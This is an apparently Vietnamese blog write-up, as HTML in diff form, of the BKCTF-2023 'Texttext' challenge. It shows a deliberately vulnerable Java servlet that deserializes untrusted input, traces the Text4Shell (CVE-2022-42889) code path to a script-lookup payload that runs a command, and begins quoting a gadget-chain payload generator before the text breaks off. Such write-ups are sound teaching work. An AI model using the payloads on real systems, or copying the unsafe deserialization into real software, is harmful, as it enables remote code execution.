@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="vi-vn">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> BKCTF-2023 Ctf Writeup - Texttext - Java deser exploit Text4Shell | devme4f blogs</title>
+  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2023/bkctf-2023_texttext/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="BKCTF-2023 Ctf Writeup - Texttext - Java deser exploit Text4Shell" />
+<meta property="og:description" content="Preface Tuần vừa rồi mình có tham gia giải BKCTF-2023 ở bảng offline, thành tích team thì cũng không có gì nổi bật nhưng trong giải mình có giải được một bài cũng khá hay dù không quá khó là bài Texttext, khi nhận giải được yêu cầu viết writeup nên yup, đây chính là nó.
+Overview Challenge cho source-code, các bạn có thể tải tại: https://drive.google.com/file/d/1onNxUHArYn3KTR3YJ8bKPykSDDm7kkMG/view?usp=drive_link
+Sau khi tải về được 1 file là textext." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://devme4f.github.io/posts/2023/bkctf-2023_texttext/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-08-20T09:22:58+07:00" />
+<meta property="article:modified_time" content="2023-08-20T09:22:58+07:00" />
+
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BKCTF-2023 Ctf Writeup - Texttext - Java deser exploit Text4Shell"/>
+<meta name="twitter:description" content="Preface Tuần vừa rồi mình có tham gia giải BKCTF-2023 ở bảng offline, thành tích team thì cũng không có gì nổi bật nhưng trong giải mình có giải được một bài cũng khá hay dù không quá khó là bài Texttext, khi nhận giải được yêu cầu viết writeup nên yup, đây chính là nó.
+Overview Challenge cho source-code, các bạn có thể tải tại: https://drive.google.com/file/d/1onNxUHArYn3KTR3YJ8bKPykSDDm7kkMG/view?usp=drive_link
+Sau khi tải về được 1 file là textext."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://devme4f.github.io/posts/2023/liferay-pentest/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://devme4f.github.io/posts/2023/sekaictf-2023_frog-waf/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&text=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&title=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&is_video=false&description=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&title=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&title=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&name=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell&description=Preface%20Tu%e1%ba%a7n%20v%e1%bb%aba%20r%e1%bb%93i%20m%c3%acnh%20c%c3%b3%20tham%20gia%20gi%e1%ba%a3i%20BKCTF-2023%20%e1%bb%9f%20b%e1%ba%a3ng%20offline%2c%20th%c3%a0nh%20t%c3%adch%20team%20th%c3%ac%20c%c5%a9ng%20kh%c3%b4ng%20c%c3%b3%20g%c3%ac%20n%e1%bb%95i%20b%e1%ba%adt%20nh%c6%b0ng%20trong%20gi%e1%ba%a3i%20m%c3%acnh%20c%c3%b3%20gi%e1%ba%a3i%20%c4%91%c6%b0%e1%bb%a3c%20m%e1%bb%99t%20b%c3%a0i%20c%c5%a9ng%20kh%c3%a1%20hay%20d%c3%b9%20kh%c3%b4ng%20qu%c3%a1%20kh%c3%b3%20l%c3%a0%20b%c3%a0i%20Texttext%2c%20khi%20nh%e1%ba%adn%20gi%e1%ba%a3i%20%c4%91%c6%b0%e1%bb%a3c%20y%c3%aau%20c%e1%ba%a7u%20vi%e1%ba%bft%20writeup%20n%c3%aan%20yup%2c%20%c4%91%c3%a2y%20ch%c3%adnh%20l%c3%a0%20n%c3%b3.%0aOverview%20Challenge%20cho%20source-code%2c%20c%c3%a1c%20b%e1%ba%a1n%20c%c3%b3%20th%e1%bb%83%20t%e1%ba%a3i%20t%e1%ba%a1i%3a%20https%3a%2f%2fdrive.google.com%2ffile%2fd%2f1onNxUHArYn3KTR3YJ8bKPykSDDm7kkMG%2fview%3fusp%3ddrive_link%0aSau%20khi%20t%e1%ba%a3i%20v%e1%bb%81%20%c4%91%c6%b0%e1%bb%a3c%201%20file%20l%c3%a0%20textext." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fbkctf-2023_texttext%2f&t=BKCTF-2023%20Ctf%20Writeup%20-%20Texttext%20-%20Java%20deser%20exploit%20Text4Shell" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#overview">Overview</a>
+      <ul>
+        <li><a href="#dockerfile">Dockerfile</a></li>
+        <li><a href="#review-source-code">Review source-code</a></li>
+      </ul>
+    </li>
+    <li><a href="#cve-2022-42889---rce-in-apache-commons-text">CVE-2022-42889 - RCE in Apache Commons Text</a></li>
+    <li><a href="#playertostring">Player#toString</a></li>
+    <li><a href="#badattributevalueexpexception-solution">BadAttributeValueExpException solution</a></li>
+    <li><a href="#refs">refs</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        BKCTF-2023 Ctf Writeup - Texttext - Java deser exploit Text4Shell
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2023-08-20 09:22:58 &#43;0700 &#43;07" itemprop="datePublished">2023-08-20</time>
+          
+        </div>
+        
+        
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/ctf" rel="tag">ctf</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/text4shell" rel="tag">text4shell</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p><img src="/images/2023/BKCTF-2023_Texttext/theme.png" alt="theme"></p>
+<h2 id="preface">Preface</h2>
+<p>Tuần vừa rồi mình có tham gia giải <em>BKCTF-2023</em> ở bảng offline, thành tích team thì cũng không có gì nổi bật nhưng trong giải mình có giải được một bài cũng khá hay dù không quá khó là bài <code>Texttext</code>, khi nhận giải được yêu cầu viết writeup nên yup, đây chính là nó.</p>
+<h2 id="overview">Overview</h2>
+<p>Challenge cho source-code, các bạn có thể tải tại: <a href="https://drive.google.com/file/d/1onNxUHArYn3KTR3YJ8bKPykSDDm7kkMG/view?usp=drive_link">https://drive.google.com/file/d/1onNxUHArYn3KTR3YJ8bKPykSDDm7kkMG/view?usp=drive_link</a></p>
+<p>Sau khi tải về được 1 file là <code>textext.rar</code>, giải nén ra gồm <code>Dockerfile</code> và folder challenge chứa source java tomcat.</p>
+<h3 id="dockerfile">Dockerfile</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> tomcat:9.0.70-jre8</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> rm -rf /usr/local/tomcat/webapps/ROOT/<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> flag.txt /flag.txt<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> challenge/text.war /usr/local/tomcat/webapps/text.war<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> config/tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> sed -i <span style="color:#e6db74">&#39;s|8080|1337|g&#39;</span> /usr/local/tomcat/conf/server.xml<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;catalina.sh&#34;</span>, <span style="color:#e6db74">&#34;run&#34;</span>]<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 1337</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>File docker này khi build còn thiếu vài file như <code>flag.txt</code>, <code>tomcat-users.xml</code> ta có thể tự thêm vào là build được.</p>
+<h3 id="review-source-code">Review source-code</h3>
+<p>Giải nén file <code>text.war</code> thì được source cũng khá đơn giản sau:
+<img src="/images/2023/BKCTF-2023_Texttext/text.war.png" alt="text.war"></p>
+<p>Ở đây webapp chạy <code>jdk8u202</code>, có 2 lib đáng chú ý là <code>commons-lang3-3.11.jar</code> và <code>commons-text-1.9.jar</code></p>
+<p><code>com.text.controller.PlayerController</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.text.controller;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* import .... */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@WebServlet</span>(
+</span></span><span style="display:flex;"><span>    urlPatterns <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;/get-name&#34;</span>}
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PlayerController</span> <span style="color:#66d9ef">extends</span> HttpServlet <span style="color:#66d9ef">implements</span> Serializable {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">PlayerController</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doGet</span>(HttpServletRequest req, HttpServletResponse resp) <span style="color:#66d9ef">throws</span> ServletException, IOException {
+</span></span><span style="display:flex;"><span>        resp.<span style="color:#a6e22e">setContentType</span>(<span style="color:#e6db74">&#34;text/html&#34;</span>);
+</span></span><span style="display:flex;"><span>        PrintWriter out <span style="color:#f92672">=</span> resp.<span style="color:#a6e22e">getWriter</span>();
+</span></span><span style="display:flex;"><span>        String player <span style="color:#f92672">=</span> req.<span style="color:#a6e22e">getParameter</span>(<span style="color:#e6db74">&#34;player&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getDecoder</span>().<span style="color:#a6e22e">decode</span>(player);
+</span></span><span style="display:flex;"><span>            InputStream is <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(data);
+</span></span><span style="display:flex;"><span>            ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(is);
+</span></span><span style="display:flex;"><span>            Object obj <span style="color:#f92672">=</span> ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>            ois.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>            Player user <span style="color:#f92672">=</span> (Player)obj;
+</span></span><span style="display:flex;"><span>            out.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;h1&gt; Hello: &#34;</span> <span style="color:#f92672">+</span> user.<span style="color:#a6e22e">getName</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; !&lt;/h1&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception var10) {
+</span></span><span style="display:flex;"><span>            out.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;h1&gt; ????????? &lt;/h1&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>PlayerController</code> nhận deserialize arbitrary object qua tham số <code>player</code> chứa string được base64 encode tại route <code>/text/get-name</code>, object này sau đó được ép kiểu về class <code>Player</code> và gọi đến <code>Player#getName()</code> để in thông báo <code>Hello</code>.</p>
+<p>Class <code>com.text.controller.Player</code> cũng khá hay ho với method đáng chú ý là <code>toString()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.text.controller;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.Serializable;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.text.StringSubstitutor;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Player</span> <span style="color:#66d9ef">implements</span> Serializable {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;player&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">boolean</span> isAdmin;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">Player</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getName</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isAdmin</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isAdmin</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span>() {
+</span></span><span style="display:flex;"><span>        String output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isAdmin</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                StringSubstitutor stringSubstitutor <span style="color:#f92672">=</span> StringSubstitutor.<span style="color:#a6e22e">createInterpolator</span>();
+</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">=</span> stringSubstitutor.<span style="color:#a6e22e">replace</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">name</span>);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (Exception var3) {
+</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;???????&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Hello&#34;</span> <span style="color:#f92672">+</span> output <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;!&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Chú ý method: <code>StringSubstitutor.createInterpolator()#replace(this.name)</code></p>
+<p>Làm vài đường google đơn giản mình tìm được <a href="https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/">CVE-2022-42889</a> hay Text4Shell khá nổi từ năm trước thuộc lib <code>commons-text</code> vulnerable từ version 1.5 đến 1.9 (fix từ 1.10).</p>
+<p>Text4Shell có thể dẫn đến RCE nếu người dùng có thể truyền input vào một trong các method như <code>StringSubstitutor.replace()</code> hay <code>StringSubstitutor.replaceIn()</code>, method này sẽ thực hiện lookup và evaluate script từ input (nghe khá giống Log4Shell nhưng không phổ biến bằng do rất ít trường hợp thực tế sử dụng <code>StringSubstitutor</code> như là logger của <code>log4j</code> cũng như phương thức khai thác Text4Shell đơn giản hơn nhiều).</p>
+<p>Hướng đi khá rõ rồi, deser kiểu gì để gọi đến được method <code>Player#toString</code> nhằm exploit <code>CVE-2022-42889</code>.</p>
+<h2 id="cve-2022-42889---rce-in-apache-commons-text">CVE-2022-42889 - RCE in Apache Commons Text</h2>
+<p>Phương thức khai thác như trong <a href="https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/">advisory</a> của <em>Alvaro Munoz</em> khá rõ ràng rồi nhưng mình vẫn sẽ debug lại để hiểu chain hoạt động của CVE này.</p>
+<p>Đầu tiên, gọi <code>StringSubstitutor#replace()</code>:
+<img src="/images/2023/BKCTF-2023_Texttext/StringSubstitutor.png" alt="StringSubstitutor"></p>
+<p>Phần <code>source</code> sẽ đi qua <code>StringSubstitutor#substitute()</code>:
+<img src="/images/2023/BKCTF-2023_Texttext/substitute.png" alt="substitute"></p>
+<p>Method này sẽ tìm trong chuỗi <code>source</code> có tồn tại đoạn expression <code>${ ... }</code> bằng cách index đoạn có prefix <code>${</code> và suffix <code>}</code>:
+<img src="/images/2023/BKCTF-2023_Texttext/source.png" alt="source"></p>
+<p>Sau một hồi lặp thì thấy được <code>varname</code> là giá trị trong expression <code>${ ... }</code>:
+<img src="/images/2023/BKCTF-2023_Texttext/varname.png" alt="varname"></p>
+<p>Và đi vào <code>StringSubstitutor#resolveVariable()</code>:
+<img src="/images/2023/BKCTF-2023_Texttext/resolveVariable.png" alt="resolveVariable"></p>
+<p>Rồi thực hiện <code>InterpolatorStringLookup#lookup()</code>:
+<img src="/images/2023/BKCTF-2023_Texttext/lookup.png" alt="lookup"></p>
+<p>Tại đây sẽ lấy ra <code>prefix</code> và <code>name</code> có giá trị lần lượt là <code>script</code> và <code>javascript:java.lang.Runtime.getRuntime().exec('calc')</code></p>
+<p>sau đó get loại lookup function trong <code>stringLookupmap</code> được lấy theo <code>prefix</code>, ta có các fields ứng với lookup function sau:
+![stringLookupmap ](/images/2023/BKCTF-2023_Texttext/stringLookupmap .png)</p>
+<p>ở đây thì method <code>scriptStringLookup()</code> về sau có thể dẫn đến RCE khi thực hiện lookup.</p>
+<p><code>ScriptStringLookup#lookup()</code>:
+<img src="/images/2023/BKCTF-2023_Texttext/ScriptStringLookup.png" alt="ScriptStringLookup"></p>
+<p>lấy <code>engineName</code> và <code>script</code> qua seperator là <code>SPLIT_STR</code> hay dấu <code>:</code>.
+Với engine là <code>javascript</code>, <code>scriptEngine</code> sẽ là <a href="https://viblo.asia/p/gioi-thieu-ve-nashorn-javascript-engine-trong-java-8-jlA7GKNLMKZQ">NashornScriptEngine</a>:</p>
+<p>Cuối cùng với <code>NashornScriptEngine#eval()</code> như dòng 35, <code>script</code> sẽ được compile và evaluate java code:
+<img src="/images/2023/BKCTF-2023_Texttext/NashornScriptEngine.png" alt="NashornScriptEngine"></p>
+<p>Full call stack:</p>
+<pre tabindex="0"><code>evalImpl:451, NashornScriptEngine (jdk.nashorn.api.scripting)
+evalImpl:406, NashornScriptEngine (jdk.nashorn.api.scripting)
+evalImpl:402, NashornScriptEngine (jdk.nashorn.api.scripting)
+eval:155, NashornScriptEngine (jdk.nashorn.api.scripting)
+eval:264, AbstractScriptEngine (javax.script)
+lookup:86, ScriptStringLookup (org.apache.commons.text.lookup)
+lookup:135, InterpolatorStringLookup (org.apache.commons.text.lookup)
+resolveVariable:1067, StringSubstitutor (org.apache.commons.text)
+substitute:1433, StringSubstitutor (org.apache.commons.text)
+substitute:1308, StringSubstitutor (org.apache.commons.text)
+replace:816, StringSubstitutor (org.apache.commons.text)
+main:11, TestMe (org.example)
+</code></pre><h2 id="playertostring">Player#toString</h2>
+<p>Sau khi tham khảo solution của team khác mình mới nhận ra solution của mình rối rắm hơn rất nhiều, các bạn có thể tham khảo solution đơn giản hơn sử dụng <code>BadAttributeValueExpException</code> <a href="#badattributevalueexpexception-solution">tại đây</a></p>
+<p>Ý tưởng của mình là tìm chain java nào đã có sẵn mà sử dụng lib <code>commons-lang</code> rồi modify lại để gọi được <code>Object#toString</code> thôi. Tra internet mãi thì không thấy, mình dùng <code>jd-gui</code> decompile lib <code>commons-lang3-3.11.jar</code> để tự tìm method có khả năng gọi được <code>Object#toString</code> mà nằm trong các chain phổ biến đã biết.</p>
+<p>Tìm từ đầu tới đuôi thì thấy <code>org.apache.commons.lang3.compare.ObjectToStringComparator#compare()</code> là ngon ăn khi method này gọi <code>Object#toString()</code> khi thực hiện compare 2 objects. Method <code>compare()</code> này mình cũng thấy quen quen, không biết gặp ở đâu rồi.
+<img src="/images/2023/BKCTF-2023_Texttext/ObjectToStringComparator.png" alt="ObjectToStringComparator"></p>
+<p>Tìm cách để có chain gọi được đến <code>ObjectToStringComparator#compare()</code> mình tìm được blog này: <a href="https://paper.seebug.org/1839/">https://paper.seebug.org/1839/</a></p>
+<p>Blog này phân tích lại lỗ hổng Apache Shiro deserialization khi dùng chain <a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">CommonsBeanutils1Shiro</a>, mình nhặt được script genPayload sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> summersec.shirodemo.Payload;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.ClassPool;
